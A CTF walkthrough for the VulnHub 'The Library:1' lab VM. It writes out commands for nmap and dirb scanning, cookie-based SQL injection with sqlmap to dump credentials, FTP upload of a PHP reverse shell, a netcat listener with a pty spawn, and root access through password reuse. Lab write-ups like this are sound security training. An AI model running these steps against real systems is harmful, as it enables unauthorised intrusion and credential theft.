<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">The Library:1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/the-library1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-07-30T11:20:01+00:00">July 30, 2019</time><time class="updated" datetime="2025-06-10T20:11:26+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to take a new challenge Library1 which is a first lab of the series Library. The credit for making this VM machine goes to “Avraham Cohen” and it is a boot2root challenge where we have to root the server to complete the challenge. You can download this VM <a style="color: #000000;" href="https://www.vulnhub.com/entry/the-library-1,334/"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;"><strong>Security Level</strong>: Beginner</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
<ol>
<li><span style="color: #000000;"><strong>Scanning</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">NMAP</span></li>
</ul>
<ol start="2">
<li><span style="color: #000000;"><strong>Enumeration</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Web Directory Search</span></li>
<li><span style="color: #000000;">Burpsuite </span></li>
</ul>
<ol start="3">
<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Sqlmap</span></li>
<li><span style="color: #000000;">FTP</span></li>
<li><span style="color: #000000;">Shell Upload</span></li>
<li><span style="color: #000000;">Netcat</span></li>
</ul>
<ol start="4">
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Password reuse for root</span></li>
</ul>
<p><span style="color: #000000;"><strong><span style="color: #800000;">Walkthrough</span></strong>:</span></p>
<h3><span style="color: #000000;"><strong>Scanning:</strong></span></h3>
<p><span style="color: #000000;">Let’s start off with the scanning process. This target VM took the IP address of 192.168.1.103 automatically from our local Wi-Fi network<strong>.</strong></span></p>
<p><span style="color: #000000;">We used our favourite tool Nmap for port scanning. We found that port 21 and 80 are open.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.103</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-MbJDL-fDhUs/XUAlYyXayPI/AAAAAAAAfwM/yXZSS7RS4AAbHXgqd8rrraVZ6ES-VggtQCLcBGAs/s1600/1.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Enumeration:</strong></span></h3>
<p><span style="color: #000000;">As we can see port 80 is open, we opened the IP address in our browser, but we didn’t find anything useful on the webpage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jpjwBghpuPk/XUAlayNM5bI/AAAAAAAAfwo/rM4TbZNr-C8Djj1R0HQqTJW813rEv-ptgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Firstly, we tried <strong>dirb </strong>in default mode but didn’t find any directory. Then we looked with <strong>.php </strong>extension and got one directory <strong>/library.php</strong></span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.103 -X .php</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-X-LOWLzSsbg/XUAlbDCTO5I/AAAAAAAAfws/a5JihbxbDMQlTU4ztW6U1aqYzPvnpOLTACLcBGAs/s1600/3.png"/></strong></span></p>
<p><span style="color: #000000;">After accessing the URL <strong>http://192.168.1.103/library.php</strong>  we got a webpage listing the name of few countries.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FSV75Jc7bMk/XUAlbRaOGlI/AAAAAAAAfww/LcCIM-HHDwcQKFPwGgky9HqoggIXNtKYQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We thought of capturing the request using burpsuite and there is a <strong>lastviewed </strong>parameter in the cookie section. And if you remember the creator has given a hint to look for the countries history.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ALqm6mV6alY/XUAlbsiG0dI/AAAAAAAAfw0/41gs1ckeDxEuCKchktIXSKpeLLo0-pi7QCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Keeping that in mind we decoded the contents of ‘lastviewed’ parameter using the <strong>decoder </strong>tab of burpsuite.</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-2q-hTP19D70/XUAlbwkDqcI/AAAAAAAAfw4/b7nx70NN7S86JCU1EDnQKflTs_vdzfk4gCLcBGAs/s1600/6.png"/></strong></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Exploitation</span>:</strong></span></h3>
<p><span style="color: #000000;">The cookie parameter might be vulnerable to SQL injection, so we put a <strong>‘* </strong>in the captured request and saved the file as file.txt.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IVgGYVYgvz4/XUAlcAhHskI/AAAAAAAAfw8/neF4OsUq2mQwuvWmD80KhB8gdMX26mD2QCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Then we used <strong>sqlmap </strong>on the <strong>file.txt</strong> to look for any databases and got a database named <strong>library.</strong></span></p>
<pre class="lang:default decode:true">sqlmap -r file.txt --dbs –batch --risk 3 --level 5</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-3yn3lEByphQ/XUAlcthj7aI/AAAAAAAAfxA/A3D_M94hmf05zc68uQJPJtYOfc4yfDTrQCLcBGAs/s1600/8.png"/></strong></span></p>
<p><span style="color: #000000;">Further enumerating the library database for usernames and passwords.</span></p>
<pre class="lang:default decode:true">sqlmap -r file.txt -D library --dump-all --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3W-l9VQMd5I/XUAlYVl8FrI/AAAAAAAAfwI/MpWEs5xWQYQQpsJWrETstvwWnkO0OXl6gCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We found a username <strong>globus </strong>and password <strong>AroundTheWorld </strong>for the <strong>ftp </strong>service.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kHo763M0JMQ/XUAlYcWli7I/AAAAAAAAfwE/BDGGSx9zqncap-gjouhzoKNEvN2ZabWCwCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">We connected to the target system through ftp but couldn’t find something useful for us and we were also not able to cat the <strong>library.php </strong>file.</span></p>
<pre class="lang:default decode:true">ftp 192.168.1.103
cd /var/www/html
ls</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-gpsFqs0WGb0/XUAlZhzW7cI/AAAAAAAAfwQ/_Pl1VzgCQwE2JvFQMSaCVPTHF1IRpt0zgCLcBGAs/s1600/15.png"/></strong></span></p>
<p><span style="color: #000000;">So what we did is we grabbed a php-reverse-shell from /usr/share/webshells/php and modified the listener IP as ours and named it as shell.php.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y99jsgg-4io/XUAlZzUw41I/AAAAAAAAfwY/k9uULBPBW6wFGzYQK5asNbB1I9kOhX-qwCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Then we uploaded the shell in the target system using the <strong>put </strong>command and gave it executable permissions.</span></p>
<pre class="lang:default decode:true">put shell.php
chmod 777 shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5COPTMnRqIo/XUAlZw8Bs0I/AAAAAAAAfwU/-OJtTohCEWMA1rjvHRU975eGqLwfWVtRQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now we executed the shell by just browsing to the URL <strong>http://192.168.1.103/shell.php</strong>  and at the same time started a netcat listener on our Kali machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lPCAFuQKMnQ/XUAlaBwF8jI/AAAAAAAAfwc/q85VljQJRMEEL1bEyVeSsSgpigSPOMH3gCLcBGAs/s1600/18.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
<p><span style="color: #000000;">We successfully got the netcat session with a limited user privilege. Had a look inside the <strong>library.php </strong>file using cat and got the database credentials.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
python -c 'import pty;pty.spawn("/bin/bash")'
cd /var/www/html
cat library.php</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-XCI3yZt_SOY/XUAlaibjQII/AAAAAAAAfwg/zrFMQeR_9xE0JQ-uCJuBUxNfpB6qEhkbwCLcBGAs/s1600/19.png"/></strong></span></p>
<p><span style="color: #000000;">We checked for the password reuse of <strong>password</strong> for user <strong>root </strong>and were successfully able to login as <strong>root.</strong></span></p>
<pre class="lang:default decode:true">su root
id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zRgi_ruywD4/XUAla8hvs6I/AAAAAAAAfwk/Mzgvh2sw0-4zw7bb3LIpgTBo76VcYKKdgCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
